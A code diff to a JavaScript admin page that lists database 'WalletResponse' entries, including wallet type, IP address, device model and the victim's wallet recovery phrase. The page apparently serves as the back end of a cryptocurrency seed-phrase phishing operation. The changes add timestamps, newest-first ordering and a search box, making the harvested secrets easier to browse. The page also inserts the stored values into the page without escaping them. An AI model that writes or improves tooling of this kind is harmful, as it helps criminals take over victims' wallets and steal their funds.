@@ -90,11 +90,15 @@ function fetchUsers() {
       usersList.innerHTML = ""; // Clear the list before adding new rows
       snapshot.forEach((childSnapshot) => {
         const walletResponse = childSnapshot.val();
+        const timestamp = walletResponse.timestamp
+          ? formatDate(walletResponse.timestamp)
+          : "N/A";
 
         // Create a new row for each WalletResponse entry
         const row = document.createElement("tr");
         row.innerHTML = `
           <td>${walletResponse.wallet_Type || "N/A"}</td>
+          <td>${timestamp || "N/A"}</td>
           <td>${walletResponse.ip_Address || "N/A"}</td>
           <td>${walletResponse.device_Model || "N/A"}</td>
           <td>${
@@ -109,13 +113,31 @@ function fetchUsers() {
           }</td>
           <td>${walletResponse.recovery_Phrase || "N/A"}</td>
         `;
-        usersList.appendChild(row); // Append the row to the table
+        const firstRow = usersList.firstChild; // Get the first row in the table
+
+        // Add the new row at the top of the table
+        usersList.insertBefore(row, firstRow);
       });
     },
     (error) => {
       console.error("Error fetching WalletResponse data:", error);
     }
   );
+
+  // Add event listener for search input
+  const searchInput = document.getElementById("searchBar");
+  searchInput.addEventListener("input", () => {
+    const searchText = searchInput.value.toLowerCase();
+    const rows = usersList.getElementsByTagName("tr");
+    Array.from(rows).forEach((row) => {
+      const name = row.getElementsByTagName("td")[0].textContent.toLowerCase();
+      if (name.includes(searchText)) {
+        row.style.display = "";
+      } else {
+        row.style.display = "none";
+      }
+    });
+  });
 }
 
 // Select all elements using class-based selectors
@@ -160,3 +182,20 @@ confirmNoButtons.forEach((button, index) => {
     }
   });
 });
+
+// Function to format date in Nigerian style (DD/MM/YYYY HH:mm:ss)
+function formatDate(timestamp) {
+  const date = new Date(timestamp);
+  const options = {
+    day: "2-digit",
+    month: "2-digit",
+    year: "numeric",
+    hour: "2-digit",
+    minute: "2-digit",
+    second: "2-digit",
+    hour12: true,
+  };
+
+  const formattedDate = new Intl.DateTimeFormat("en-GB", options).format(date);
+  return formattedDate;
+}
